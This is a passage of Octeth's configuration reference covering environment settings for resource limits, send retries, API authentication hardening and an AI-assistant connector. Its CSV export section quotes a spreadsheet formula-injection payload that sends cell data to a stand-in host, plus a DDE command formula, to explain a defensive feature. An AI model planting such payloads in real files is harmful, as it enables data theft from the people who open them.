38. **New-List Suppression Default & Synchronous Import Threshold**

    ```bash
    NEW_LIST_DEFAULT_ADD_TO_SUPPRESSION_LIST=false   # opt-outs on NEW lists feed the suppression lists by default (default: false)
    RUN_IMPORT_IN_SYNC_FOR_SUBSCRIBERS_LESS_THAN=50  # imports at or below this row count run synchronously (default: 50)
    ```

    Both of these are read with a code-level default, so they apply even when the key is absent from your `.oempro_env`. Both defaults changed in v5.9.3, which means an installation that never set them will see the new behaviour after upgrading.

    **`NEW_LIST_DEFAULT_ADD_TO_SUPPRESSION_LIST`** controls the initial value of the two per-list suppression settings (`OptOutAddToSuppressionList` / `OptOutAddToGlobalSuppressionList`) when a **new** subscriber list is created without an explicit value for them. With `false`, new lists start with both set to *No*: an unsubscribe from such a list does not automatically add the address to the list-level or global suppression list. Set it to `true` to restore the pre-v5.9.3 behaviour.

    The scope is narrow but easy to misread: this affects **only lists created after the setting takes effect**. Existing lists store these settings as their own columns and are never rewritten by this key, so changing it neither breaks nor retroactively fixes any list you already have. Each list's setting also remains editable in that list's settings page. If your deliverability or compliance posture depends on new lists feeding your suppression lists automatically, set this explicitly rather than relying on the default.

    **`RUN_IMPORT_IN_SYNC_FOR_SUBSCRIBERS_LESS_THAN`** sets the row count at or below which a CSV import through `POST api/v1/subscribers.import` is processed **synchronously**, inline within the API request, instead of being queued. Raising the default from 10 to 50 means imports of 11–50 rows now return `ImportType: sync` and the HTTP request blocks until the import finishes. If you have an API client with timeout assumptions built around the asynchronous path, either lower this value or extend that client's timeout.

39. **Email Gateway Recipient Resolution Timeout**

    ```bash
    SENDEMAIL_RECIPIENT_RESOLUTION_TIMEOUT=30   # Total timeout (seconds) for resolving a list send's recipients (default: 30)
    ```

    When `emailgateway.sendemail` is called with a list rather than explicit recipients, it resolves that audience through an internal call to the query builder. This setting bounds that call, and is applied to both the connection and the total execution time.

    The value was previously hard-coded at `5` seconds. That became visible in v5.9.3: a failed resolution now aborts the send with HTTP 502 rather than silently returning an empty `MessageID`, so on a large list a slow-but-healthy resolution turned into a failed send instead of a silent no-op. The default of 30 seconds gives large lists room to resolve.

    It is deliberately a separate setting from `SUBSCRIBER_BROWSE_QUERY_TIMEOUT`, even though both bound the same backend. The browse page is an interactive render that an operator may reasonably want to fail fast; this is a send path, where failing fast drops mail. Tuning one should not silently change the other. A value of `0` or below is ignored and the 30-second default is used instead, because the underlying HTTP client treats a zero timeout as *wait forever*.

40. **Container Resource Limits**

    ```bash
    # Data tier
    MYSQL_CPU_LIMIT=0                       # CPU cores for oempro_mysql (default: 0 = unlimited)
    MYSQL_MEM_LIMIT=0                       # Hard memory cap for oempro_mysql (default: 0 = unlimited)
    MYSQL_MEM_RESERVATION=0                 # Soft memory floor for oempro_mysql (default: 0 = none)
    CLICKHOUSE_CPU_LIMIT=0
    CLICKHOUSE_MEM_LIMIT=0
    CLICKHOUSE_MEM_RESERVATION=0
    REDIS_CPU_LIMIT=0
    REDIS_MEM_LIMIT=0
    REDIS_MEM_RESERVATION=0
    RABBITMQ_CPU_LIMIT=0
    RABBITMQ_MEM_LIMIT=0
    RABBITMQ_MEM_RESERVATION=0

    # Application tier
    SENDENGINE_CPU_LIMIT=3.0                # Send engine (default: 3.0 — unchanged from previous releases)
    SENDENGINE_MEM_LIMIT=                   # Leave EMPTY: each compose file supplies its own default (3G single-host, 6G dedicated MTA host). Setting a value pins both.
    SENDENGINE_MEM_RESERVATION=512M
    SENDENGINE_REPLICAS=                    # Number of send engine containers. Empty = deploy.replicas in docker-compose.yml (1 as shipped)
    LINK_PROXY_CPU_LIMIT=3.0                # Link proxy / tracking (default: 3.0 — unchanged)
    LINK_PROXY_MEM_LIMIT=3G
    LINK_PROXY_MEM_RESERVATION=512M
    OEMPRO_SUPERVISOR_CPU_LIMIT=0
    OEMPRO_SUPERVISOR_MEM_LIMIT=0
    OEMPRO_SUPERVISOR_MEM_RESERVATION=0
    OEMPRO_CPU_LIMIT=0
    OEMPRO_MEM_LIMIT=0
    OEMPRO_MEM_RESERVATION=0
    OEMPRO_SYSTEM_CPU_LIMIT=0
    OEMPRO_SYSTEM_MEM_LIMIT=0
    OEMPRO_SYSTEM_MEM_RESERVATION=0
    OEMPRO_UI_CPU_LIMIT=0                   # New user interface container, oempro_ui (default: 0 = unlimited)
    OEMPRO_UI_MEM_LIMIT=0
    OEMPRO_UI_MEM_RESERVATION=0
    OEMPRO_CRON_CPU_LIMIT=0
    OEMPRO_CRON_MEM_LIMIT=0
    OEMPRO_CRON_MEM_RESERVATION=0

    # Edge / auxiliary tier
    VECTOR_CPU_LIMIT=0
    VECTOR_MEM_LIMIT=0
    VECTOR_MEM_RESERVATION=0
    EG_INBOUND_SMTP_CPU_LIMIT=0
    EG_INBOUND_SMTP_MEM_LIMIT=0
    EG_INBOUND_SMTP_MEM_RESERVATION=0
    HAPROXY_CPU_LIMIT=0
    HAPROXY_MEM_LIMIT=0
    HAPROXY_MEM_RESERVATION=0
    MAILPIT_CPU_LIMIT=0
    MAILPIT_MEM_LIMIT=0
    MAILPIT_MEM_RESERVATION=0
    ```

    Octeth runs as fourteen Docker containers on one host. Previously only two of them — the send engine and the link proxy — had any CPU or memory cap, and both values were hard-coded in `docker-compose.yml`, a version-controlled file that is replaced on upgrade. Everything else, including the memory-hungry data tier (`oempro_mysql`, `oempro_clickhouse`, `oempro_redis`, `oempro_rmq`) and the worker tier (`oempro_supervisor`, `oempro_cron`), ran with no cgroup limit at all. A single container that leaks memory or spins the CPU could therefore starve every other service on the machine, and container-level throttling and memory-versus-limit monitoring only produced meaningful data for those two services.

    Every service now reads three optional settings from `.oempro_env`:

    - **`<SERVICE>_CPU_LIMIT`** — a ceiling on CPU cores, fractional values allowed (`1.5` = one and a half cores). It caps total CPU time; it does not pin the container to specific cores.
    - **`<SERVICE>_MEM_LIMIT`** — a **hard** memory cap. A container that exceeds it is killed by the kernel's OOM killer and restarted by its restart policy.
    - **`<SERVICE>_MEM_RESERVATION`** — a **soft** floor. It only biases the kernel's reclaim decisions when the host is under memory pressure. It does not reserve memory and it will not prevent an OOM kill; it is not a guarantee.

    **`0` means unlimited** and is the default for twelve of the fourteen services, so this entire section is opt-in: an install that never sets these values behaves exactly as it did before. The send engine and link proxy default to the same `3.0` cores / `3G` / `512M` they have always used, so their behavior is unchanged too.

    **Leave `SENDENGINE_MEM_LIMIT` empty unless you mean to pin it.** It is the one value whose default differs per compose file: `3G` in `docker-compose.yml` and `6G` in `docker-compose.mta.yml` (the standalone file used when the send engine runs on its own MTA host, which has more headroom because it runs nothing else). An **empty** value falls through to whichever compose file is in use and takes that file's own default, preserving the historical behavior on both. Writing a value into `.oempro_env` **pins both files to it** — writing `3G` would silently downgrade a dedicated MTA host from its historical `6G`. Every other variable in this section has the same default in both files, so this caveat applies only here.

    **`SENDENGINE_REPLICAS` sets how many send engine containers run on this server.** It is empty by default, which means "use `deploy.replicas` from `docker-compose.yml`" (1 as shipped, or the number you put there by hand), so an install that never sets it behaves as before. A whole number is passed to Docker Compose as `--scale oempro_sendengine=N` by `docker:up`, `docker:restart`, the installer, `upgrade` (and its rollback), `env:apply`, and by `sendengine:start` and `sendengine:restart` when they run without `--scale`, so the count survives all of them. `./cli/octeth.sh sendengine:scale N` writes the value for you; add `--no-persist` to scale for now only. `0` runs no send engine on this server, for an install that sends only from a dedicated MTA host. A value that is not a whole number is ignored with a warning. The CPU and memory limits above are per container, so `SENDENGINE_CPU_LIMIT` × `SENDENGINE_REPLICAS` must fit the host's cores. The key is read only by `./cli/octeth.sh` on this server: a dedicated MTA host started from `docker-compose.mta.yml` keeps its own `--scale` and ignores it, even though `sendengine-deploy-to-server.sh` copies this file there. Before this key existed, a count set with `sendengine:scale` lasted only until the next `docker:up` or upgrade.

    **Units matter.** Memory accepts `b`, `k`, `m` and `g` suffixes — `512m`, `2g`, `3G`. A bare number is interpreted as **bytes**, so `MYSQL_MEM_LIMIT=2` means two bytes and the container will fail to start. Always write a suffix.

    **Applying and verifying.** Limits are applied when a container is created, so run `./cli/octeth.sh docker:up` (or `docker:restart`) after changing them, then confirm with:

    ```bash
    docker inspect oempro_mysql --format 'Memory={{.HostConfig.Memory}} NanoCpus={{.HostConfig.NanoCpus}}'
    ```

    A value of `0` for either field means no limit is in force. The Octeth CLI passes `--env-file .oempro_env` to Docker Compose, so these settings apply on every CLI-driven run — including `./cli/octeth.sh upgrade`, which does not otherwise load the environment file. If you invoke `docker compose` directly, pass `--env-file .oempro_env` yourself; there is no root `.env` file, so without it Compose falls back to the defaults baked into the compose file.

    **Choosing values.** Deliberately no non-zero defaults are shipped for the other twelve services: a memory cap that is too low turns a healthy but busy service into an OOM-kill loop, and the right number depends entirely on host size and workload. Start generous, watch actual usage, then tighten. Keep the sum of all memory limits comfortably below total host RAM, and note these caps are **per container** — the send engine is horizontally scaled, so *N* replicas can consume up to *N* × the limit.

    Service-specific cautions:

    - **`oempro_mysql`** is the most memory-sensitive container. Its InnoDB buffer pool is configured separately (`_dockerfiles/mysql/conf.d`); set `MYSQL_MEM_LIMIT` **above** `innodb_buffer_pool_size` plus per-connection buffers, or MySQL will be OOM-killed mid-query. On a dedicated host, 50–70% of RAM is a reasonable start.
    - **`oempro_redis`** does not evict when it hits a *cgroup* limit — it is killed. If you set `REDIS_MEM_LIMIT`, also configure a Redis-level `maxmemory` **below** it so Redis evicts instead of dying.
    - **`oempro_rmq`** has its own memory high-watermark flow control. Keep `RABBITMQ_MEM_LIMIT` above that watermark so flow control engages before the OOM killer does.
    - **`oempro_clickhouse`** also has its own `max_server_memory_usage`; the cgroup cap is the outer bound.
    - **`oempro_supervisor`** runs every long-running loop worker and carries the highest runaway risk, which makes it the best candidate for a first limit. The workers already self-recycle on PHP memory (see *Long-Running Worker Memory Hygiene*); keep this cap well above the combined worker `memory_limit` so supervisord does not thrash.
    - **`oempro_haproxy`** handles every inbound request and is the worst container in the stack to OOM-kill. Do not starve it.

    On a **fresh install**, `install:start` lowers `SENDENGINE_CPU_LIMIT` and `LINK_PROXY_CPU_LIMIT` to fit the host when it has fewer than four cores — see *Octeth Installation* for the sizing table. Existing installs are never adjusted automatically.

41. **CSV Export Formula Protection**

    ```bash
    CSV_EXPORT_FORMULA_PROTECTION=true      # Prefix formula-looking CSV cells with an apostrophe (default: true)
    ```

    Protects the people who open your CSV exports from **spreadsheet formula injection**.

    Subscriber custom-field values are supplied by whoever fills in your signup forms, so they are attacker-controlled by design. Excel, LibreOffice Calc and Google Sheets *evaluate* a cell whose first character is `=`, `+`, `-` or `@` — and OWASP also lists **TAB** and **CR**, because some importers strip leading control characters before deciding whether a cell is a formula. A subscriber can therefore store `=HYPERLINK("https://evil.example/?d="&A1,"click")` in a custom field, and the account owner who exports their own list gets a live link that exfiltrates the neighbouring cell when clicked. Legacy Excel additionally honors `=cmd|'/c calc'!A1` (DDE). Nothing needs to be wrong with Octeth for this to work — only an export that faithfully reproduces attacker-supplied text.

    When enabled, every CSV Octeth produces routes its cells through one shared helper that prefixes such a value with a **single quote**. Every major spreadsheet reads that as "this cell is text, do not evaluate it" and does not display the apostrophe in the cell.

    Correct CSV quoting does **not** fix this on its own. Quoting decides how the file *parses*; the spreadsheet still *evaluates* the resulting cell.

    **Covered exports:** subscriber exports, multi-list subscriber exports, campaign exports and the campaign comparison export, journey report exports, the admin campaign report export, scheduled automated campaign reports, account reports, and the failed-rows report produced by an import.

    **What changes in your files — this is visible.** Ordinary, non-malicious values gain a leading apostrophe in the raw bytes:

    | Stored value | In the exported file |
    |---|---|
    | `-10%` | `'-10%` |
    | `+15551234567` | `'+15551234567` |
    | `@handle` | `'@handle` |
    | `=1+1` | `'=1+1` |

    Generated report cells are affected too — the "vs previous period" deltas in account reports (`+12.3%`, `-4.5pt`) and any negative residual in journey report rows.

    **Re-importing into Octeth is lossless.** Octeth's own CSV import strips exactly one leading apostrophe, and only when what follows it would itself have been prefixed, so export → re-import does not accumulate apostrophes:

    - `=1+1` → exported `'=1+1` → re-imported `=1+1`
    - `-10%` → exported `'-10%` → re-imported `-10%`
    - `'hello` (an apostrophe you typed yourself, in front of ordinary text) → exported `'hello` → re-imported `'hello`, unchanged

    One edge case: a value you deliberately stored as `'=1+1` (your own apostrophe in front of a formula character) is indistinguishable from the protection prefix and comes back as `=1+1` — once. It does not change again on later round trips. This strip is **always** active and is not affected by the setting.

    **Third-party consumers are not covered.** Anything outside Octeth that reads your exports — a BI tool, a CRM sync, a script — sees the apostrophe and must strip it itself. That is the only reason to turn this off:

    ```bash
    # Restores byte-identical pre-v5.9.3 export output
    CSV_EXPORT_FORMULA_PROTECTION=false
    ```

    **API note.** The `emailgateway.exportevents` API endpoint has applied this prefixing since it shipped and continues to do so **unconditionally**, ignoring this setting, so existing API callers see no change in either direction.

42. **Send-Engine Proactive Allocation Guard Rails**

    ```bash
    SENDENGINE_PROACTIVE_FAILURE_BUDGET=25          # Consecutive worker failures before slot refills stop (default: 25)
    SENDENGINE_PROACTIVE_BACKOFF_BASE_SECONDS=5     # First backoff delay in seconds; doubles per failure (default: 5)
    SENDENGINE_PROACTIVE_BACKOFF_MAX_SECONDS=300    # Ceiling for that doubling backoff (default: 300)
    ```

    The send-engine controller keeps every sending campaign topped up to its maximum worker count with a **proactive allocation** pass that runs every 5 seconds and refills any freed slot. That pass consulted no failure counter and had no backoff, so a campaign whose workers crash immediately — bad delivery-server credentials, an unreachable MTA, a fatal error in the delivery worker — was respawned indefinitely at a steady 5-second cadence. The result was continuous process churn, log volume and load against an already-failing delivery server, with no ceiling and no operator signal that the campaign was stuck. (The controller's existing per-campaign respawn guard only ever gated its own one-for-one respawn when a worker died; it never applied to this refill.)

    - **`SENDENGINE_PROACTIVE_FAILURE_BUDGET`** — consecutive worker failures for a single campaign at or above which the proactive pass stops refilling that campaign's slots. The default matches the controller's existing respawn budget, so the first 25 failures behave exactly as they did before. Accepted range `1`–`1000`.
    - **`SENDENGINE_PROACTIVE_BACKOFF_BASE_SECONDS`** — the first delay before refilling a campaign that has recorded a failure. It doubles with each additional consecutive failure (5s, 10s, 20s, 40s …) up to the ceiling. The default equals the pass's own 5-second cadence, so the first retry is no slower than before. Accepted range `1`–`300`.
    - **`SENDENGINE_PROACTIVE_BACKOFF_MAX_SECONDS`** — the ceiling for that doubling backoff. Accepted range `1`–`3600`. If configured **below** the base value it is raised to the base, since a ceiling under the base would silently cancel the growth.

    **How a campaign recovers.** The counters are per campaign and live in the controller process. Each worker that exits cleanly **decays** its campaign's failure count by one. It is deliberately *not* reset by a single clean exit: exiting `0` does not prove the worker did any useful work — a worker that handled an exception internally, and a surplus worker that found no pending batch, both exit `0` — so zeroing on any clean exit would let a mixed crash loop hold the count at zero and the budget would never engage. A campaign therefore bleeds its failures off as its workers complete and recovers on its own once the underlying fault is fixed, with **no controller restart required**. The practical consequence is that a campaign sitting well above its budget needs one clean exit per excess failure before it drops back under. The counters are cleared outright only when a campaign's last worker exits and the controller discards its state.

    **Operator signal.** A campaign that exhausts its budget is logged once at `ERROR` and reported as `proactive_blocked` in `data/logs/sendengine_worker_allocation.log`. Deliberate pauses and stops are **not** counted as failures.

43. **Journey Action Failure Retries**

    ```bash
    JOURNEY_ACTION_FAILURE_MAX_ATTEMPTS=6            # Attempts before an entry is dead-ended (default: 6)
    JOURNEY_ACTION_FAILURE_RETRY_BASE_SECONDS=900    # Delay before the first retry, doubles per failure (default: 900)
    JOURNEY_ACTION_FAILURE_RETRY_MAX_SECONDS=21600   # Ceiling for that doubling backoff (default: 21600)
    ```

    A journey action that failed used to advance the subscriber to the next action anyway. The entry moved on as though the subscriber had been emailed, so they permanently missed that email even after the underlying fault was fixed, and nothing in the interface said so. A failing action now holds the entry in place, retries it on a doubling backoff, and dead-ends it with the reason recorded once the attempts run out.

    - **`JOURNEY_ACTION_FAILURE_MAX_ATTEMPTS`** sets how many times an action is attempted before the entry is dead-ended with the failure reason recorded. Attempts are counted as the run of *consecutive* failed executions for the same entry and action, so an attempt that succeeds resets the count to zero. Accepted range `1`–`20`.
    - **`JOURNEY_ACTION_FAILURE_RETRY_BASE_SECONDS`** sets how long the entry waits before the first retry. The delay doubles on each additional consecutive failure up to the ceiling. Accepted range `30`–`86400`.
    - **`JOURNEY_ACTION_FAILURE_RETRY_MAX_SECONDS`** is the longest an entry waits between retries. Accepted range `30`–`604800`. A value below the base is raised to the base, since a ceiling under the base would silently cancel the doubling.

    **What the shipped defaults buy you.** An entry is retried after 15 minutes, 30 minutes, 1 hour, 2 hours and 4 hours before it is given up on. That leaves most of a working day to fix a misconfigured sender domain or a gateway outage without losing the send.

    **Where failures are recorded.** On `oempro_journeys_action_executions` with `ExecutionStatus='Failed'`, plus `ErrorMessage`, `ErrorCode`, and for a pending retry `SnoozedUntil` and `SnoozeReason`. They also appear in the journey log.

44. **Campaign Sender-Domain Auto Branding**

    ```bash
    CAMPAIGN_SENDER_DOMAIN_AUTO_BRANDING=true       # Brand campaigns with a matching verified sender domain (default: true)
    ```

    The Email Gateway has always branded messages with the account's own verified sender domain, gated only on that domain being `Enabled`. The campaign path additionally required the user group's **Sender Domain Management** option *and* an explicit per-content sender-domain selection. For one and the same account the gateway mail therefore carried customer-domain headers while the campaigns carried the shared platform delivery-server domain, which is the channel that sends the most volume.

    When this is `true`, a campaign whose From address domain exactly matches one of the account's `Enabled` sender domains is branded with that domain even if the group option is off. The envelope MFROM, `Message-ID`, `List-Unsubscribe`, `X-Report-Abuse` and `X-Complaints-To` all move to the customer domain.

    **Matching is exact.** A From address on `mail.example.com` does not match a verified `example.com`. An account with no matching verified domain sends exactly the headers it sent before.

    **Precedence is unchanged at the top.** An explicit per-content sender-domain selection still wins. This From-domain match sits between that and the group `DefaultSenderDomain` fallback.

    **The tracking host is gated separately.** Click and open links only move to the customer domain when that domain's verification actually covered the tracking record. If a customer verified their MFROM records but never pointed the tracking CNAME, the MFROM and `Message-ID` are branded while tracking stays on the platform host. Pointing links at an unprovisioned hostname would break every URL in the message.

    **When to turn it off.** Set it to `false` if you run a shared-IP warmup pool that depends on platform-branded campaign headers. Enabling this moves reputation onto a colder customer domain.


45. **Email Template Thumbnail Upload Limit**

    ```bash
    TEMPLATE_THUMBNAIL_MAX_FILESIZE=2097152    # Max decoded thumbnail size in bytes for email.template.thumbnail.upload (default: 2 MB)
    ```

    Maximum decoded size, in bytes, of a thumbnail accepted by the `email.template.thumbnail.upload` API command (gif, png or jpeg, the same allow-list as the admin "create email template" form). The image is stored base64-encoded in the `TemplateThumbnail` column of the templates table, so keep it small. Clamped to `[10240, 20971520]`; values outside that range fall back to the default. Introduced in v5.9.6 (issue #2787).


46. **System Health Check Authentication**

    ```bash
    SYSTEM_HEALTH_CHECK_AUTH_REQUIRED=true    # Strict credential check on system.health.check (code default false; fresh installs and upgrades get true)
    SYSTEM_HEALTH_CHECK_TOKEN=                # Dedicated monitor credential, honoured only while the switch above is true (default: empty)
    ```

    `system.health.check` (`GET /api/v1/system-health-check`) has always required the master
    `ADMIN_API_KEY`, as the `AdminAPIKey` parameter or an `Authorization: Bearer` header, which
    meant every external uptime monitor held the one credential that unlocks every admin command.

    With `SYSTEM_HEALTH_CHECK_AUTH_REQUIRED=true` the endpoint accepts a call only with a valid
    `AdminAPIKey` (the master key or a per-sub-admin key), or with `SYSTEM_HEALTH_CHECK_TOKEN`
    sent as the `HealthCheckToken` parameter or as `Authorization: Bearer <token>`. Anything else
    answers HTTP 401 with `{"Success":false,"ErrorCode":99998,"ErrorMessage":"Invalid API key"}`
    and no health data. The token grants the health report and nothing else, so a monitoring host
    never needs the master key. Generate one with `openssl rand -hex 32`; leave it empty to keep
    `AdminAPIKey` as the only credential.

    While off, the historical check applies: master key only, refused with HTTP 500 and error `100005`. The code default is `false`, but the shipped `.oempro_env.example` sets it to `true`, and an upgrade adds every setting your `.oempro_env` is missing with the example's value. So an install upgrading from a version older than v5.9.6 gets `true` too, exactly like a fresh install, and the upgrade names it in a warning block when it adds it. An install that already has the key keeps its value. To keep it off, add `SYSTEM_HEALTH_CHECK_AUTH_REQUIRED=false` to `.oempro_env` before upgrading, or set it to `false` afterwards and recreate the containers. The command's registration and its success response are unchanged.
    Introduced in v5.9.6 (issue #2767).

47. **Admin API IP Allow-List Enforcement**

    ```bash
    ADMIN_API_ENFORCE_ALLOWED_IP=true    # Apply the admin-area IP allow-list to admin-authenticated API calls (code default false; fresh installs and upgrades get true)
    ```

    The admin-area "Authorized IP Addresses" list (Settings, Security; one IPv4 address or CIDR
    per line) was only ever checked when the admin login page rendered. `api.php` did not consult
    it, so `AdminAPIKey`, an admin `SessionID` from `admin.login` and admin username/password all
    worked from any address.

    When this is `true` and the list is non-empty, every admin-authenticated API call from an
    address outside the list answers the existing `99998` envelope. The address is the client IP
    after `TRUSTED_PROXIES` / `TRUST_CLOUDFLARE_CONNECTING_IP` resolution. There is no exemption
    for loopback or private ranges: an integration that calls `api.php` with an admin credential
    from inside the Docker network, or from another server, must have its address or subnet added
    to the list first. The product's own screens are unaffected because they call the API
    in-process, not over HTTP. An empty list means no restriction in either mode, exactly as on the
    login page.

    The code default is `false`, but the shipped `.oempro_env.example` sets it to `true`, and an upgrade adds every setting your `.oempro_env` is missing with the example's value. So an install upgrading from a version older than v5.9.6 gets `true` too, and the upgrade names it in a warning block when it adds it. To keep it off, add `ADMIN_API_ENFORCE_ALLOWED_IP=false` to `.oempro_env` before upgrading, or set it to `false` afterwards and recreate the containers.

    The address compared is your visitor's real address. From v6.0.0 the bundled reverse proxy is trusted through `INTERNAL_PROXY_NETWORKS`; before v6.0.0 a request through the proxy resolved to the proxy's own address, `192.168.99.100`, and a call made by the new user interface resolved to its container address, `192.168.99.110` (issue #2935). The bundled new user interface's own calls are exempt from the list (issue #2913). If you added a `192.168.99.x` address or subnet to the list as a v5.9.6 workaround, remove it before upgrading and list the real public addresses your admins and integrations call from: left as the only entry it matches no one, and every admin API call other than the new user interface's is refused. If you run your own load balancer, reverse proxy or CDN in front of Octeth, list it in `TRUSTED_PROXIES` or set `TRUST_CLOUDFLARE_CONNECTING_IP`, otherwise the address compared is that proxy's. Introduced in v5.9.6 (issue #2770).

48. **Internal Service Signature**

    ```bash
    SYSTEM_INTERNAL_SIGNATURE_REQUIRED=true   # Require the X-Octeth-Signature header on the private /system/* services (code default false; fresh installs and upgrades get true)
    ```

    Octeth's own PHP processes call five private Laravel services in the `oempro_system` container
    over HTTP: `/system/segment_query_builder`, `/system/subscribers_query_builder`,
    `/system/queue_query_builder`, `/system/mime_email_parser` and `/system/email/spamtest`. HAProxy
    routes every `/system/` request to that container, so these services were reachable from the
    internet with at most a source-address allow-list in front of them.

    Every caller shipped with Octeth now sends the `X-Octeth-Signature` header, the same shared
    secret `/system/search_translator` and the bounce webhook use
    (`sha256(OEMPRO_PASSWORD_SALT + ADMIN_API_KEY + OEMPRO_PASSWORD_SALT)`). Nothing needs to be
    configured for the product's own callers.

    - `true`: a request to one of these services without a valid header answers HTTP 401 with
      `{"error":"unauthorized access"}`, whether it comes from inside the Docker network or from the
      internet.
    - `false` or absent: unsigned requests are still accepted, but each one is logged at WARNING in
      the Laravel log (`system/storage/logs/laravel-YYYY-MM-DD.log`) with the route and the client
      address, for example `[internal.signature] unsigned request to a private /system/ service
      accepted because SYSTEM_INTERNAL_SIGNATURE_REQUIRED is off {"route":"system/segment_query_builder","remote_addr":"192.168.99.100"}`.
      The subscriber, segment and queue builders also keep their source-address allow-lists in this
      mode.

    **Upgrade note.** The upgrade adds this setting as `true` unless your `.oempro_env` already has
    it, and the code default is `false`. If a third-party plugin or script posts to one of these
    services, add `SYSTEM_INTERNAL_SIGNATURE_REQUIRED=false` to `.oempro_env` before upgrading,
    leave it off for a few days and grep the Laravel log for
    `[internal.signature]`. Every hit is an unsigned caller: a third-party plugin or an integration
    script that posts to one of these services directly. Update it to pass
    `Core::InternalRequestHeaders()` as the ninth argument of `Core::DataPostToRemoteURL()` (or
    `Core::InternalRequestHeadersForURL($url)` when the target URL is configurable), then set the
    flag to `true`. A `remote_addr` of `192.168.99.100` is HAProxy, which means the request came
    from outside the install and should be blocked.

    **`SPAM_FILTER_URL` and this flag.** The signature is sent to the spam test service only when
    `SPAM_FILTER_URL` points at the `oempro_system` service itself (the default). If you point
    `SPAM_FILTER_URL` at an external host, no secret is sent to it and the flag has no effect on
    that call.

    **Rotation.** Changing `OEMPRO_PASSWORD_SALT` or `ADMIN_API_KEY` changes the derived value on
    both sides at once, so no coordinated update is needed. Introduced in v5.9.6 (issue #2813).

49. **New User Interface**

    ::: tip
    This section is the exhaustive parameter list. For step-by-step guides on signing in to the
    interface, branding it, and configuring its billing system, see
    [The New User Interface](../new-user-interface/).
    :::

    The Laravel application at `ui/`, served from its own `oempro_ui` container. It is always on
    from v6.0.2: there is no switch to turn it off (issue #3494). Every key below
    is read by that container's entrypoint, which renders them into `ui/.env` on each start.
    Changing any of them therefore needs the container recreated, not merely restarted:
    `./cli/octeth.sh docker:up`.

    ```bash
    UI_APP_KEY=                          # Laravel app key; leave EMPTY on a fresh install and the container generates one
    UI_LOG_LEVEL=error                   # debug, info, notice, warning, error, critical, alert, emergency
    UI_MYSQL_DATABASE=oempro_ui          # Its OWN database. MUST NOT equal MYSQL_DATABASE
    UI_DEBUG_CONSOLE_ENABLED=false       # Who may open the API debug console (default: false)
    MCP_REDIRECT_DOMAINS=                # Hosts a connected AI assistant may redirect to; empty = any https host
    MCP_ENABLED=true                     # The AI assistant connector at /mcp, /oauth/ and /.well-known/oauth- (default: true)
    MCP_DISCOVERY_ENABLED=true           # Serve /llms.txt and /agents/openapi.json for AI agents (default: true)
    MCP_DISCOVERY_HELP_URL=              # Help page /llms.txt links to; empty = Octeth's documentation
    ```

    `UI_DEBUG_CONSOLE_ENABLED` governs the interface's API debug console. When the console is
    open, the full backend response of every API call made while rendering a page is written into
    that page's HTML, which is what makes it useful for diagnosing a field-name mismatch between
    the interface and the backend, and what makes it unsafe to leave open.

    The console requires a **staff** session, and either `APP_ENV=local` or this flag. A customer
    cannot switch it on, and neither can a staff member on a production install until an operator
    sets this to `true`. Credential-shaped fields are removed from the response bodies it renders
    whatever this is set to, so the flag decides **who may open the console**, not how much it
    discloses. Turn it on only while investigating something on a staging install, and turn it off
    afterwards.

    A change takes effect on the next **start** of the interface's container, which reads
    `.oempro_env` off the bind mount each time it boots. The key is not referenced by the
    container's Compose definition, so a plain `up -d oempro_ui` sees no change to that service and
    leaves the running container alone, silently keeping the old setting in force. Recreate it
    explicitly:

    ```bash
    docker compose -f docker-compose.yml --env-file .oempro_env up -d --force-recreate oempro_ui
    ```

    `docker compose restart oempro_ui` has the same effect. Neither needs a rebuild: the flag is
    read at start time, not baked into the image. The shipped example value matches the application
    default, so an upgrade that adds this key does not change how your install behaves.

    `MCP_REDIRECT_DOMAINS` limits which websites an AI assistant may send a customer back to after
    the customer approves it on the **Connect an AI assistant** screen of the built-in MCP endpoint
    (the OAuth redirect host). Set it to a comma-separated list of host names, for example
    `MCP_REDIRECT_DOMAINS=claude.ai,chatgpt.com`. An entry that starts with `*.` allows every
    subdomain of that host: `*.example.com` allows `app.example.com` but not `example.com` itself,
    so list both when you need both.

    Empty, the default, allows any https host, which is what most installs want: a list that names
    only some assistants blocks every other one, Gemini and self-hosted agents included. Whatever
    the list says, redirects back to the customer's own computer (`http://localhost`,
    `http://127.0.0.1` and `http://[::1]`, on any port) are always allowed, because local agents
    such as Claude Code, Gemini CLI and Codex receive the sign-in result that way. Every other
    redirect must use https.

    The list is checked when an assistant registers itself, when the server reads an assistant's
    client metadata document (assistants that identify themselves by an https URL instead of
    registering), and on every connection attempt, so narrowing it also stops assistants that
    registered earlier. A refused assistant sees "This assistant cannot connect" with the reason,
    and nothing is sent to the refused host. Like the other keys here, a change takes effect when
    the interface's container next starts. Introduced in v6.0.2 (issue #3372).

    `MCP_ENABLED` turns the built-in AI assistant connector on or off: the MCP endpoint at `/mcp`
    and its sign-in and discovery paths under `/oauth/` and `/.well-known/oauth-`, at the root of
    the app domain. Customers add `https://<app domain>/mcp` to Claude, ChatGPT or another MCP
    client and approve it on the **Connect an AI assistant** screen. Set it to `false` (or `0`,
    `no`, `off`, in any case) to turn the connector off. The reverse proxy then answers 404 for
    those three paths, and the interface answers 404 for them too, while the rest of the interface
    keeps working. `/llms.txt` leaves out its connector section, and the setup readiness report
    shows the connector check as missing. Agent keys created on the **Connected AI assistants**
    page keep working against the HTTP API. An absent key means on. Recreate the HAProxy and
    interface containers after changing it (`./cli/octeth.sh docker:up`, or
    `./cli/octeth.sh env:apply MCP_ENABLED=false --yes`, which runs
    `docker compose up -d --force-recreate oempro_ui haproxy` for you). The code default and the
    shipped example are both `true`, so an upgrade that adds the key leaves the connector on.
    Introduced in v6.0.2 (issue #3494).

    `MCP_DISCOVERY_ENABLED` publishes two files for AI agents at the root of the app domain:
    `/llms.txt`, which points an agent to the connector URL, the OpenAPI
    document and the help article, and `/agents/openapi.json`, an OpenAPI 3.1 description of every
    API command an AI agent key may call, with the scope each needs and the agent error codes
    100010 to 100016. The document is generated from Octeth's agent allow-list
    (`AgentPolicy::$AgentCommands`) and cached until the policy file or an API handler changes,
    so it cannot drift from what the API allows. Parameters the policy refuses to agent keys are
    left out. Neither file contains any account data. Set it to `false` (or `0`, `no`, `off`, in
    any case) when the app domain serves its own `/llms.txt`, or to publish neither: the interface
    then answers 404 for both and the reverse proxy stops routing the two paths to it, so they
    reach the legacy application as before. Recreate the HAProxy and interface containers after
    changing it (`./cli/octeth.sh docker:up`). The code default and the shipped example are both
    `true`, so an upgrade that adds the key publishes the files. Introduced in v6.0.2 (issue #3393).

    `MCP_DISCOVERY_HELP_URL` is the help page `/llms.txt` links to, an `http` or `https` URL.
